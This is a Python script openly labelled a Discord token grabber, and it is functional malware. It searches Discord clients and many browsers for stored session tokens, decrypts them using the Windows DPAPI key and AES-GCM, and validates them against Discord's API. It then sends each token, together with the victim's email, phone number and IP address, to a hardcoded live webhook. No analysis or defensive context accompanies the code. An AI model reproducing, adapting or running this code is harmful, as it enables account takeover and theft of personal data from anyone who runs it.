# Discord token grabber with robust browser and Discord app support
# 7-29-25
# Author: AirFlow
# Contact: https://airflowd.netlify.app/

import os
import sys
import re
import json
import base64
import urllib.request
import datetime
import subprocess
from threading import Thread
import logging
import sqlite3
from Crypto.Cipher import AES
import win32crypt
import time

logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
Logger = logging.getLogger("TokenGrabber")

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher.AES", "pycryptodome"), ("sqlite3", "sqlite3")])

WEBHOOK_URL = 'https://discord.com/api/webhooks/1405552880190095511/AZUlR7eQC4jQ-iOdTQ7LU6Tp_uj5W64915aRldiE8fdVsLuOlWi7la9wCYzUwl5B4o81'  

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'Iridium': LOCAL + '\\Iridium\\User Data',
    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
}

def get_encryption_key(path):
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        Logger.info(f"No Local State file at {local_state_path}")
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            Logger.info(f"No encrypted_key in Local State at {local_state_path}")
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        Logger.info(f"Successfully retrieved encryption key at {path}")
        return key
    except Exception as e:
        Logger.error(f"Failed to get encryption key at {path}: {e}")
        return None

def decrypt_token(encrypted_token, key):
    try:
        encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
        iv = encrypted_token[3:15]
        ciphertext = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
        return decrypted.decode(errors="ignore").strip()
    except Exception as e:
        Logger.error(f"Decryption failed: {e}")
        return None

def safe_storage_steal(path, platform):
    tokens = []
    key = get_encryption_key(os.path.dirname(path) if "Brave" in platform or "Chrome" in platform or "Edge" in platform or "Opera" in platform or "Vivaldi" in platform or "Yandex" in platform or "Amigo" in platform or "Torch" in platform or "Kometa" in platform or "Orbitum" in platform or "CentBrowser" in platform or "7Star" in platform or "Sputnik" in platform or "Epic Privacy Browser" in platform or "Uran" in platform or "Iridium" in platform else path)
    if not key and any(x in platform for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
        Logger.info(f"No encryption key for {platform} at {path}")
        return tokens
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        Logger.info(f"No LevelDB found at {path}")
        return tokens
    for leveldb_path in leveldb_paths:
        Logger.info(f"Scanning LevelDB at {leveldb_path}")
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                Logger.info(f"Checking file: {file_path}")
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
                        for match in matches:
                            match = match.rstrip("\\")
                            decrypted = decrypt_token(match, key) if key else None
                            if decrypted and (decrypted, platform) not in tokens:
                                Logger.info(f"Found decrypted token in {platform}: {file_path}")
                                tokens.append((decrypted, platform))
        except Exception as e:
            Logger.error(f"Failed to read tokens from {leveldb_path}: {e}")
    return tokens

def simple_steal(path, platform):
    tokens = []
    leveldb_paths = []
    for root, dirs, _ in os.walk(path):
        if "leveldb" in dirs:
            leveldb_paths.append(os.path.join(root, "leveldb"))
    if not leveldb_paths:
        Logger.info(f"No LevelDB found at {path}")
        return tokens
    for leveldb_path in leveldb_paths:
        Logger.info(f"Scanning LevelDB for unencrypted tokens at {leveldb_path}")
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                Logger.info(f"Checking file: {file_path}")
                with open(file_path, errors="ignore") as f:
                    lines = f.readlines()
                for line in lines:
                    if line.strip():
                        matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                        for match in matches:
                            match = match.rstrip("\\").strip()
                            if (match, platform) not in tokens:
                                Logger.info(f"Found unencrypted token in {platform}: {file_path}")
                                tokens.append((match, platform))
        except Exception as e:
            Logger.error(f"Failed to read unencrypted tokens from {leveldb_path}: {e}")
    return tokens

def firefox_steal(path, platform):
    tokens = []
    sqlite_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                sqlite_paths.append(os.path.join(root, file))
    if not sqlite_paths:
        Logger.info(f"No SQLite databases found at {path}")
        return tokens
    for sqlite_path in sqlite_paths:
        Logger.info(f"Scanning SQLite database at {sqlite_path}")
        try:
            with open(sqlite_path, errors="ignore") as f:
                lines = f.readlines()
            for line in lines:
                if line.strip():
                    matches = re.findall(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", line)
                    for match in matches:
                        match = match.rstrip("\\").strip()
                        if (match, platform) not in tokens:
                            Logger.info(f"Found token in {platform} SQLite: {sqlite_path}")
                            tokens.append((match, platform))
        except Exception as e:
            Logger.error(f"Failed to read tokens from {sqlite_path}: {e}")
    return tokens

def steal_cookies(path, platform):
    tokens = []
    cookie_path = os.path.join(path, "Network", "Cookies")
    if not os.path.exists(cookie_path):
        Logger.info(f"No Cookies database at {cookie_path}")
        return tokens
    try:
        if not os.access(cookie_path, os.R_OK):
            Logger.error(f"No read permission for Cookies database at {cookie_path}")
            return tokens
        with open(cookie_path, 'rb') as f:
            pass  # Test file access
        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
        conn.text_factory = bytes
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'")
        key = get_encryption_key(os.path.dirname(path))
        for row in cursor.fetchall():
            encrypted_value = row[0]
            try:
                decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                decrypted = decrypted.strip()
                if decrypted and re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", decrypted) and (decrypted, platform) not in tokens:
                    Logger.info(f"Found token in cookies at {cookie_path}")
                    tokens.append((decrypted, platform))
            except Exception as e:
                Logger.error(f"Failed to decrypt cookie at {cookie_path}: {e}")
        conn.close()
    except Exception as e:
        Logger.error(f"Failed to access Cookies database at {cookie_path}: {e}")
    return tokens

def get_tokens(platform, path):
    tokens = []
    Logger.info(f"Scanning {platform} at {path}")
    if not os.path.exists(path):
        Logger.info(f"Path does not exist: {path}")
        return tokens
    if "Firefox" in platform:
        tokens.extend(firefox_steal(path, platform) or [])
    else:
        if any(x in platform for x in ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]):
            profiles = ['Default'] + [f"Profile {i}" for i in range(1, 10)]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if os.path.exists(profile_path):
                    Logger.info(f"Found profile: {profile_path}")
                    tokens.extend(safe_storage_steal(profile_path, f"{platform} ({profile})") or [])
                    tokens.extend(simple_steal(profile_path, f"{platform} ({profile})") or [])
                    tokens.extend(steal_cookies(profile_path, f"{platform} ({profile})") or [])
        else:
            tokens.extend(safe_storage_steal(path, platform) or [])
            tokens.extend(simple_steal(path, platform) or [])
    return tokens

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "Unavailable"

def send_to_webhook(embed):
    try:
        data = json.dumps(embed, ensure_ascii=False).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers=get_headers(), method="POST")
        with urllib.request.urlopen(req) as response:
            Logger.info(f"Webhook sent successfully, status: {response.status}")
        time.sleep(1)  # Delay to avoid rate limiting
    except urllib.error.HTTPError as e:
        Logger.error(f"Failed to send webhook: HTTP Error {e.code}: {e.reason}")
        try:
            error_response = e.read().decode()
            Logger.error(f"Webhook error response: {error_response}")
        except:
            Logger.error("Could not read webhook error response")
        Logger.info(f"Failed webhook payload: {json.dumps(embed, indent=2)}")
    except Exception as e:
        Logger.error(f"Failed to send webhook: {e}")
        Logger.info(f"Failed webhook payload: {json.dumps(embed, indent=2)}")

def send_token_info(token, user_data, platform, ip):
    try:
        Logger.info(f"User data for {platform}: {json.dumps(user_data, indent=2)}")
        username = user_data.get('username', 'Unknown')
        discriminator = user_data.get('discriminator', '0')
        if not username or not isinstance(username, str):
            username = "Unknown"
        if not discriminator or not isinstance(discriminator, str):
            discriminator = "0"
        badges = ""
        flags = user_data.get('flags', 0)
        if flags & 64: badges += ":BadgeBravery: "
        if flags & 128: badges += ":BadgeBrilliance: "
        if flags & 256: badges += ":BadgeBalance: "

        embed = {
            "username": "AirFlow",
            "avatar_url": "https://i.postimg.cc/SjFr90RK/Screenshot-2025-07-08-212908.png",
            "embeds": [
                {
                    "title": f"New Discord Token Found: {username}#{discriminator} ({platform})",
                    "color": 1752220,
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{user_data.get('id', '0')}/{user_data.get('avatar', '')}.png" if user_data.get('avatar') else ""
                    },
                    "fields": [
                        {"name": "User ID", "value": user_data.get('id', 'N/A'), "inline": True},
                        {"name": "Email", "value": user_data.get('email', 'N/A'), "inline": True},
                        {"name": "Phone", "value": str(user_data.get('phone', 'N/A')), "inline": True},
                        {"name": "Flags", "value": str(flags), "inline": True},
                        {"name": "Badges", "value": badges or "None", "inline": True},
                        {"name": "Platform", "value": platform, "inline": True},
                        {"name": "IP Address", "value": ip, "inline": True},
                        {"name": "Token", "value": f"```{token}```", "inline": False}
                    ],
                    "footer": {
                        "text": f"Sent at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} • Developed by AirFlow. https://airflowd.netlify.app/"
                    }
                }
            ]
        }
        send_to_webhook(embed)
    except Exception as e:
        Logger.error(f"Failed to build webhook payload for {platform}: {e}")

def main():
    Logger.info("Starting token grabber")
    ip = get_ip()
    Logger.info(f"IP Address: {ip}")
    found_tokens = []
    threads = []

    for platform, path in PATHS.items():
        t = Thread(target=lambda: found_tokens.extend(get_tokens(platform, path)))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    if not found_tokens:
        Logger.info("No tokens found on this machine")
        return

    unique_tokens = []
    for token, platform in found_tokens:
        if not re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", token):
            Logger.info(f"Skipping invalid token format from {platform}: {token}")
            continue
        Logger.info(f"Raw token from {platform}: {token}")
        if token not in [t[0] for t in unique_tokens]:
            try:
                req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(token))
                with urllib.request.urlopen(req) as response:
                    if response.status == 200:
                        user_data = json.loads(response.read().decode())
                        unique_tokens.append((token, platform))
                        Logger.info(f"Valid token found for user: {user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0')} on {platform}")
                        send_token_info(token, user_data, platform, ip)
                    else:
                        Logger.error(f"Token validation failed on {platform} with status {response.status}: {response.reason}")
            except Exception as e:
                Logger.error(f"Failed to validate token on {platform}: {e}")

    if unique_tokens:
        Logger.info(f"Found {len(unique_tokens)} unique tokens")
    else:
        Logger.info("No valid tokens found")

if __name__ == "__main__":
    main()

